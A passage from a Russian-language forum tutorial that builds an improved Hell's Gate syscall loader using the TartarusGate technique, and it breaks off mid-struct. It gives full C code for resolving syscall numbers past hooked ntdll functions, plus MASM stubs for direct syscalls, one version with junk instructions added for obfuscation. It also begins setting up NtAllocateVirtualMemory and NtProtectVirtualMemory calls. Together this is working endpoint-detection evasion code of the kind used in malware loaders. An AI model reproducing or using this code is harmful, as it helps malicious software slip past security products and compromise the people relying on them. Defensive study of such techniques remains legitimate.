            break; // –í—ã—Ö–æ–¥ –∏–∑ —Ü–∏–∫–ª–∞ for
        }
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞, –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω—ã –ª–∏ –≤—Å–µ —ç–ª–µ–º–µ–Ω—Ç—ã NT_SYSCALL (pNtSys)
    if (pNtSys-&gt;dwSSn != NULL &amp;&amp; pNtSys-&gt;pSyscallAddress != NULL &amp;&amp; pNtSys-&gt;dwSyscallHash != NULL)
        return TRUE;
    else
        return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–£–ª—É—á—à–µ–Ω–∏–µ –ª–æ–≥–∏–∫–∏ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è SSN</b><br />
<br />
–ù–∞–ø–æ–º–Ω–∏–º, —á—Ç–æ –ø—Ä–∏ –ø–æ–∏—Å–∫–µ SSN (–Ω–æ–º–µ—Ä–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞) Hell&#039;s Gate –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç –≥—Ä–∞–Ω–∏—Ü—ã –ø–æ–∏—Å–∫–∞, –ø—Ä–æ–≤–µ—Ä—è—è –Ω–∞–ª–∏—á–∏–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π syscall –∏–ª–∏ ret. –ï—Å–ª–∏ –æ–¥–Ω–∞ –∏–∑ —ç—Ç–∏—Ö –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π –Ω–∞–π–¥–µ–Ω–∞, –∏ SSN –µ—â–µ –Ω–µ –±—ã–ª –ø–æ–ª—É—á–µ–Ω, —Ç–æ –ø–æ–∏—Å–∫ –∑–∞–≤–µ—Ä—à–∞–µ—Ç—Å—è –Ω–µ—É–¥–∞—á–µ–π, —á—Ç–æ –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ—Ç –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è SSN –∏–∑ –¥—Ä—É–≥–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787731238.png"
		data-src="https://osint42.org/attachments/1746787731238-png.255/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787731238-png.255/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787731238.png"
			title="1746787731238.png"
			width="794" height="353" loading="lazy" />
	</div><br />
<br />
<b>TartarusGate</b><br />
<br />
–í TartarusGate –±—ã–ª –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–± –ø–æ–∏—Å–∫–∞ SSN, –∫–æ—Ç–æ—Ä—ã–π –∏–ª–ª—é—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787739086.png"
		data-src="https://osint42.org/attachments/1746787739086-png.256/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787739086-png.256/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787739086.png"
			title="1746787739086.png"
			width="1242" height="598" loading="lazy" />
	</div><br />
<br />
–ü—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —á—Ç–æ –≤—ã–∑–æ–≤ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ B –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ Hell&#039;s Gate. –í —ç—Ç–æ–º —Å–ª—É—á–∞–µ –±—É–¥–µ—Ç –æ—Å—É—â–µ—Å—Ç–≤–ª—è—Ç—å—Å—è –ø–æ–∏—Å–∫ –æ–ø–µ—Ä–∞—Ü–∏–π 0x4c, 0x8b, 0xd1, 0xb8, –∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—Ç —Å–æ–±–æ–π –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ mov r10, rcx –∏ mov rcx, ssn. –ù–æ, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –≤—ã—à–µ, —Ç–∞–∫–∏—Ö –æ–ø–µ—Ä–∞—Ü–∏–π –Ω–µ—Ç, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è Hell&#039;s Gate –Ω–µ —Å–º–æ–∂–µ—Ç –ø–æ–ª—É—á–∏—Ç—å SSN –¥–ª—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ B.<br />
<br />
TartarusGate –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å–æ—Å–µ–¥–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –¥–ª—è –≤—ã—á–∏—Å–ª–µ–Ω–∏—è SSN —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. –ï—Å–ª–∏ TartarusGate –∏—â–µ—Ç –≤–≤–µ—Ä—Ö, —Ç–æ SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ B —Ä–∞–≤–µ–Ω SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ A - 1. –° –¥—Ä—É–≥–æ–π —Å—Ç–æ—Ä–æ–Ω—ã, –µ—Å–ª–∏ TartarusGate –∏—â–µ—Ç –≤–Ω–∏–∑, —Ç–æ SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ B —Ä–∞–≤–µ–Ω SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ C + 1.<br />
<br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –ø—É—Ç—å –ø–æ–∏—Å–∫–∞ –º–æ–∂–µ—Ç —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—è—Ç—å—Å—è –∑–∞ –ø—Ä–µ–¥–µ–ª—ã –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ —Å–æ—Å–µ–¥–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤. –ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –≤—ã–∑–æ–≤ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ C, —Ç–æ SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ C –±—É–¥–µ—Ç —Ä–∞–≤–µ–Ω —Å–ª–µ–¥—É—é—â–∏–º –≤–æ–∑–º–æ–∂–Ω—ã–º –æ–ø–µ—Ä–∞—Ü–∏—è–º:<br />
<br />
Syscall A&#039;s SSN plus two<br />
Syscall B&#039;s SSN plus one<br />
Syscall D&#039;s SSN minus one<br />
Syscall E&#039;s SSN minus two<br />
Syscall F&#039;s SSN minus three<br />
<br />
–ù–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ —ç—Ç–æ –±–æ–ª–µ–µ –Ω–∞–≥–ª—è–¥–Ω–æ –∏–ª–ª—é—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è, –≥–¥–µ idx - —ç—Ç–æ —á–∏—Å–ª–æ –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∏–ª–∏ –≤—ã—á–∏—Ç–∞–Ω–∏—è.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787747960.png"
		data-src="https://osint42.org/attachments/1746787747960-png.257/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787747960-png.257/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787747960.png"
			title="1746787747960.png"
			width="1212" height="696" loading="lazy" />
	</div><br />
<br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ FetchNtSyscall</b><br />
<br />
–ü–æ—Å–ª–µ –ø–æ–Ω–∏–º–∞–Ω–∏—è —Ç–æ–≥–æ, –∫–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç TartarusGate, —Ñ—É–Ω–∫—Ü–∏—è FetchNtSyscall –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —ç—Ç–æ–π –ª–æ–≥–∏–∫–∏ –ø–æ–∏—Å–∫–∞. –ù–µ–∫–æ—Ç–æ—Ä—ã–µ –∞—Å–ø–µ–∫—Ç—ã –æ–±–Ω–æ–≤–ª–µ–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ FetchNtSyscall:<br />
<br />
RANGE —Ä–∞–≤–µ–Ω 255, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤, —á—Ç–æ–±—ã –¥–≤–∏–≥–∞—Ç—å—Å—è –≤–≤–µ—Ä—Ö –∏–ª–∏ –≤–Ω–∏–∑ –≤ –ø–∞–º—è—Ç–∏.<br />
<br />
UP —Ä–∞–≤–Ω–æ 32, —á—Ç–æ —è–≤–ª—è–µ—Ç—Å—è —Ä–∞–∑–º–µ—Ä–æ–º —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. –≠—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ø—Ä–∏ –ø–æ–∏—Å–∫–µ –≤–≤–µ—Ä—Ö.<br />
DOWN —Ä–∞–≤–Ω–æ -32, —á—Ç–æ —è–≤–ª—è–µ—Ç—Å—è –æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–º —Ä–∞–∑–º–µ—Ä–æ–º —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. –≠—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ø—Ä–∏ –ø–æ–∏—Å–∫–µ –≤–Ω–∏–∑.<br />
<br />
–ö–æ–≥–¥–∞ –ø—É—Ç—å –ø–æ–∏—Å–∫–∞ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –≤–≤–µ—Ä—Ö, SSN —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤—ã—á–∏—Å–ª—è–µ—Ç—Å—è –∫–∞–∫ (high &lt;&lt; 8) | low + idx, –≥–¥–µ idx - —ç—Ç–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –≤—ã—à–µ —Ç–µ–∫—É—â–µ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ (–∞–¥—Ä–µ—Å pFuncAddress). –ö–æ–≥–¥–∞ –ø—É—Ç—å –ø–æ–∏—Å–∫–∞ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –≤–Ω–∏–∑, SSN —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤—ã—á–∏—Å–ª—è–µ—Ç—Å—è –∫–∞–∫ (high &lt;&lt; 8) | low - idx, –≥–¥–µ idx - —ç—Ç–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –Ω–∏–∂–µ —Ç–µ–∫—É—â–µ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ (–∞–¥—Ä–µ—Å pFuncAddress).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ ntdll, –µ—Å–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }

    if (dwSysHash != NULL)
        pNtSys-&gt;dwSyscallHash = dwSysHash;
    else
        return FALSE;

    for (size_t i = 0; i &lt; g_NtdllConf.dwNumberOfNames; i++){

        PCHAR pcFuncName    = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress  = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        pNtSys-&gt;pSyscallAddress = pFuncAddress;

        // if syscall found
        if (HASH(pcFuncName) == dwSysHash) {

            if (*((PBYTE)pFuncAddress) == 0x4C
                &amp;&amp; *((PBYTE)pFuncAddress + 1) == 0x8B
                &amp;&amp; *((PBYTE)pFuncAddress + 2) == 0xD1
                &amp;&amp; *((PBYTE)pFuncAddress + 3) == 0xB8
                &amp;&amp; *((PBYTE)pFuncAddress + 6) == 0x00
                &amp;&amp; *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low  = *((PBYTE)pFuncAddress + 4);
                pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low;
                break; // –í—ã—Ö–æ–¥ –∏–∑ —Ü–∏–∫–ª–∞ for-loop [i]
            }

            // if hooked - scenario 1
            if (*((PBYTE)pFuncAddress) == 0xE9) {

                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // –í—ã—Ö–æ–¥ –∏–∑ —Ü–∏–∫–ª–∞ for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // –í—ã—Ö–æ–¥ –∏–∑ —Ü–∏–∫–ª–∞ for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // –í—ã—Ö–æ–¥ –∏–∑ —Ü–∏–∫–ª–∞ for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // –í—ã—Ö–æ–¥ –∏–∑ —Ü–∏–∫–ª–∞ for-loop [idx]
                    }
                }
            }

            break; // –í—ã—Ö–æ–¥ –∏–∑ —Ü–∏–∫–ª–∞ for-loop [i]

        }

    }

    if (pNtSys-&gt;dwSSn != NULL &amp;&amp; pNtSys-&gt;pSyscallAddress != NULL &amp;&amp; pNtSys-&gt;dwSyscallHash != NULL)
        return TRUE;
    else
        return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–±–æ—Ä–æ—á–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π</b><br />
<br />
–§—É–Ω–∫—Ü–∏–∏ HellsGate –∏ HellDescent, –Ω–∞–π–¥–µ–Ω–Ω—ã–µ –≤ —Ñ–∞–π–ª–µ hellsgate.asm, –±—É–¥—É—Ç –∑–∞–º–µ–Ω–µ–Ω—ã –Ω–∞ SetSSn –∏ RunSyscall —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ. SetSSn —Ç—Ä–µ–±—É–µ—Ç SSN –≤—ã–∑—ã–≤–∞–µ–º–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∞ RunSyscall –≤—ã–ø–æ–ª–Ω—è–µ—Ç –µ–≥–æ.<br />
<br />
–í —ç—Ç–∏—Ö –¥–≤—É—Ö —Ñ—É–Ω–∫—Ü–∏—è—Ö –Ω–µ –ø—Ä–æ–∏–∑–≤–æ–¥—è—Ç—Å—è –∫—Ä—É–ø–Ω—ã–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è, –æ–¥–Ω–∞–∫–æ –±—ã–ª–∏ –¥–æ–±–∞–≤–ª–µ–Ω—ã –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –∞—Å—Å–µ–º–±–ª–µ—Ä–∞, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –≤–ª–∏—è—é—Ç –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã, –Ω–æ –¥–æ–±–∞–≤–ª—è—é—Ç –æ–±—Ñ—É—Å–∫–∞—Ü–∏—é.<br />
<br />
–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–±–æ—Ä–æ—á–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –§—É–Ω–∫—Ü–∏–∏ HellsGate –∏ HellDescent, –Ω–∞–π–¥–µ–Ω–Ω—ã–µ –≤ —Ñ–∞–π–ª–µ hellsgate.asm, –±—É–¥—É—Ç –∑–∞–º–µ–Ω–µ–Ω—ã –Ω–∞ SetSSn –∏ RunSyscall —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ. SetSSn —Ç—Ä–µ–±—É–µ—Ç SSN –≤—ã–∑—ã–≤–∞–µ–º–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∞ RunSyscall –≤—ã–ø–æ–ª–Ω—è–µ—Ç –µ–≥–æ.<br />
<br />
–í —ç—Ç–∏—Ö –¥–≤—É—Ö —Ñ—É–Ω–∫—Ü–∏—è—Ö –Ω–µ –ø—Ä–æ–∏–∑–≤–æ–¥—è—Ç—Å—è –∫—Ä—É–ø–Ω—ã–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è, –æ–¥–Ω–∞–∫–æ –±—ã–ª–∏ –¥–æ–±–∞–≤–ª–µ–Ω—ã –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –∞—Å—Å–µ–º–±–ª–µ—Ä–∞, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –≤–ª–∏—è—é—Ç –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã, –Ω–æ –¥–æ–±–∞–≤–ª—è—é—Ç –æ–±—Ñ—É—Å–∫–∞—Ü–∏—é.<br />
<br />
<b>–ù–µ–∑–∞—Ç—Ä–æ–Ω—É—Ç—ã–µ —Å–±–æ—Ä–æ—á–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏</b><br />
<br />
SetSSN –∏ RunSyscall –±–µ–∑ –ª–∏—à–Ω–∏—Ö —Å–±–æ—Ä–æ—á–Ω—ã—Ö –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>.data
    wSystemCall DWORD 0000h

.code

    SetSSn PROC
        mov wSystemCall, ecx
        ret
    SetSSn ENDP

    RunSyscall PROC
        mov r10, rcx
        mov eax, wSystemCall
        syscall
        ret
    RunSyscall ENDP

end</code></pre>
	</div>
</div><br />
<b>–°–±–æ—Ä–æ—á–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ —Å –æ–±—Ñ—É—Å–∫–∞—Ü–∏–µ–π</b><br />
<br />
SetSSN –∏ RunSyscall —Å –¥–æ–±–∞–≤–ª–µ–Ω–Ω—ã–º–∏ —Å–±–æ—Ä–æ—á–Ω—ã–º–∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è–º–∏:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>.data
    wSystemCall DWORD 0000h

.code

    SetSSn PROC
        xor eax, eax          ; eax = 0
        mov wSystemCall, eax  ; wSystemCall = 0
        mov eax, ecx          ; eax = ssn
        mov r8d, eax          ; r8d = eax = ssn
        mov wSystemCall, r8d  ; wSystemCall = r8d = eax = ssn
        ret
    SetSSn ENDP

    RunSyscall PROC
        xor r10, r10          ; r10 = 0
        mov rax, rcx          ; rax = rcx
        mov r10, rax          ; r10 = rax = rcx
        mov eax, wSystemCall  ; eax = ssn
        jmp Run                ; –≤—ã–ø–æ–ª–Ω–∏—Ç—å &#039;Run&#039;
        xor eax, eax           ; –Ω–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è
        xor rcx, rcx           ; –Ω–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è
        shl r10, 2             ; –Ω–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è
    Run:
        syscall
        ret
    RunSyscall ENDP

end</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –≥–ª–∞–≤–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏<br />
<br />
–°–æ–∑–¥–∞–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã NTAPI_FUNC</b><br />
<br />
–û–±–Ω–æ–≤–ª–µ–Ω–Ω–∞—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è Hell&#039;s Gate –∑–∞–≤–µ—Ä—à–µ–Ω–∞.<br />
–ü–æ—Å–ª–µ–¥–Ω–∏–π —à–∞–≥ - —ç—Ç–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏, –∫–æ—Ç–æ—Ä–æ–µ —Ç—Ä–µ–±—É–µ—Ç –≥–ª–∞–≤–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏. –î–ª—è —ç—Ç–æ–≥–æ —Å–æ–∑–¥–∞–µ—Ç—Å—è –Ω–æ–≤–∞—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞, –∫–æ—Ç–æ—Ä–∞—è –∑–∞–º–µ–Ω—è–µ—Ç VX_TABLE. –ù–æ–≤–∞—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ NTAPI_FUNC –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–∞—Ö. –•—Ä–∞–Ω–µ–Ω–∏–µ —ç—Ç–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ –ø–æ–∑–≤–æ–ª–∏—Ç –≤—ã–∑—ã–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ä–∞–∑, –∫–æ–≥–¥–∞ –æ–Ω–∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É—é—Ç—Å—è –∫–∞–∫ –≥–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è.<br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ NTAPI_FUNC –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –Ω–∏–∂–µ:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _NTAPI_FUNC
{
    NT_SYSCALL    NtAllocateVirtualMemory;
    NT_SYSCALL    NtProtectVirtualMemory;
